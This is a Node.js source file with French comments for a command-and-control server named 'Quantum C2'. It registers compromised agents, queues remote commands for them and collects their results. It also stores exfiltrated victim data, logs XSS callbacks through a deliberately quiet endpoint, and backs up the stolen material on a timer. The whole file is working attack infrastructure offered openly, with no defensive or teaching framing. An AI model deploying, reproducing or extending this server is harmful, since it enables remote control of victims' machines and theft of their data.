// server.js - Serveur C2 Quantum avec interface de gestion
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const ENCRYPTION_KEY = "votre_cle_secrete_unique"; // Doit correspondre à celle du client
const MAX_LOG_SIZE = 1000;

// Structures de données
const agents = new Map();           // { id: { lastSeen, info, commands } }
const commandHistory = new Map();   // { id: [{ command, timestamp }] }
const agentLogs = new Map();        // { id: [{ result, time }] }
const exfiltratedData = new Map();  // { id: [{ type, data, timestamp }] }

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Fonction de déchiffrement
function decryptData(encrypted) {
    try {
        const decipher = crypto.createDecipheriv(
            'aes-256-cbc', 
            crypto.createHash('sha256').update(ENCRYPTION_KEY).digest(),
            Buffer.alloc(16, 0)
        );
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        console.error("Decryption error:", error);
        return null;
    }
}

// Endpoint pour la réception des données des agents
app.post('/monitor/:id', (req, res) => {
    const agentId = req.params.id;
    const encryptedData = req.body.data;
    
    if (!encryptedData) {
        return res.status(400).json({ error: "Missing encrypted data" });
    }
    
    const data = decryptData(encryptedData);
    if (!data) {
        return res.status(400).json({ error: "Decryption failed" });
    }
    
    // Mise à jour des informations de l'agent
    if (!agents.has(agentId)) {
        agents.set(agentId, {
            lastSeen: new Date(),
            info: {},
            commands: []
        });
        commandHistory.set(agentId, []);
        agentLogs.set(agentId, []);
        exfiltratedData.set(agentId, []);
    }
    
    const agent = agents.get(agentId);
    agent.lastSeen = new Date();
    
    // Traitement des différents types de messages
    switch (data.result?.type) {
        case 'registration':
            agent.info = data.result.data.host_info;
            break;
            
        case 'heartbeat':
            // Rien de spécial à faire pour les heartbeats
            break;
            
        case 'command_result':
            // Stockage du résultat
            if (agentLogs.get(agentId).length >= MAX_LOG_SIZE) {
                agentLogs.get(agentId).shift();
            }
            agentLogs.get(agentId).push({
                result: data.result.data.result,
                time: new Date(data.result.data.timestamp * 1000).toISOString()
            });
            break;
            
        case 'exfiltration':
            // Stockage des données exfiltrées
            exfiltratedData.get(agentId).push({
                type: data.result.data.data_type,
                data: data.result.data.content,
                timestamp: new Date(data.result.data.timestamp * 1000).toISOString()
            });
            break;
            
        default:
            // Stockage générique
            agentLogs.get(agentId).push({
                result: data,
                time: new Date().toISOString()
            });
    }
    
    res.json({ status: "received" });
});

// Endpoint pour envoyer des commandes aux agents
app.post('/monitor/:id/commands', (req, res) => {
    const agentId = req.params.id;
    const command = req.body.command;
    
    if (!command) {
        return res.status(400).json({ error: "Missing command" });
    }
    
    if (!agents.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    const agent = agents.get(agentId);
    const timestamp = new Date().toISOString();
    
    // Ajout à la file d'attente des commandes
    agent.commands.push({ command, timestamp });
    
    // Ajout à l'historique
    if (commandHistory.get(agentId).length >= MAX_LOG_SIZE) {
        commandHistory.get(agentId).shift();
    }
    commandHistory.get(agentId).push({ command, timestamp });
    
    res.json({ status: "Command added" });
});

// Endpoint pour récupérer les commandes (agent)
app.get('/monitor/:id/commands', (req, res) => {
    const agentId = req.params.id;
    
    if (!agents.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    const agent = agents.get(agentId);
    const commands = [...agent.commands];
    agent.commands = []; // Vidage de la file
    
    res.json({ commands });
});

// Endpoint pour récupérer l'historique des commandes
app.get('/monitor/:id/commands/history', (req, res) => {
    const agentId = req.params.id;
    
    if (!commandHistory.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    res.json({ history: commandHistory.get(agentId) });
});

// Endpoint pour récupérer les logs d'un agent
app.get('/monitor/:id', (req, res) => {
    const agentId = req.params.id;
    
    if (!agentLogs.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    res.json({ logs: agentLogs.get(agentId) });
});

// Endpoint pour récupérer les données exfiltrées
app.get('/monitor/:id/exfiltrated', (req, res) => {
    const agentId = req.params.id;
    
    if (!exfiltratedData.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    res.json({ data: exfiltratedData.get(agentId) });
});

// Endpoint pour lister tous les agents
app.get('/agents', (req, res) => {
    const agentsList = Array.from(agents.keys()).map(id => ({
        id,
        lastSeen: agents.get(id).lastSeen,
        info: agents.get(id).info,
        commandCount: agents.get(id).commands.length
    }));
    
    res.json({ agents: agentsList });
});

// Endpoint pour les callbacks XSS
app.get('/monitor/:id/xss', (req, res) => {
    const agentId = req.params.id;
    const query = req.query;
    
    if (!agentLogs.has(agentId)) {
        return res.status(404).json({ error: "Agent not found" });
    }
    
    // Stockage du callback XSS
    const logEntry = {
        result: `XSS Callback: ${JSON.stringify(query)}`,
        time: new Date().toISOString()
    };
    
    agentLogs.get(agentId).push(logEntry);
    
    // Réponse vide pour être discret
    res.sendStatus(200);
});

// Interface d'administration
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Sauvegarde périodique des données
setInterval(() => {
    const data = {
        agents: Array.from(agents.entries()),
        commandHistory: Array.from(commandHistory.entries()),
        agentLogs: Array.from(agentLogs.entries()),
        exfiltratedData: Array.from(exfiltratedData.entries())
    };
    
    fs.writeFileSync('c2-backup.json', JSON.stringify(data, null, 2));
    console.log('Data backup completed');
}, 600000); // Toutes les 10 minutes

// Restauration au démarrage
if (fs.existsSync('c2-backup.json')) {
    try {
        const backup = JSON.parse(fs.readFileSync('c2-backup.json', 'utf8'));
        
        agents.clear();
        commandHistory.clear();
        agentLogs.clear();
        exfiltratedData.clear();
        
        backup.agents.forEach(([id, data]) => agents.set(id, data));
        backup.commandHistory.forEach(([id, data]) => commandHistory.set(id, data));
        backup.agentLogs.forEach(([id, data]) => agentLogs.set(id, data));
        backup.exfiltratedData.forEach(([id, data]) => exfiltratedData.set(id, data));
        
        console.log('Data restored from backup');
    } catch (e) {
        console.error('Backup restoration failed:', e);
    }
}

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`🚀 Quantum C2 Server running at http://localhost:${PORT}`);
    console.log(`🔒 Encryption Key: ${ENCRYPTION_KEY}`);
});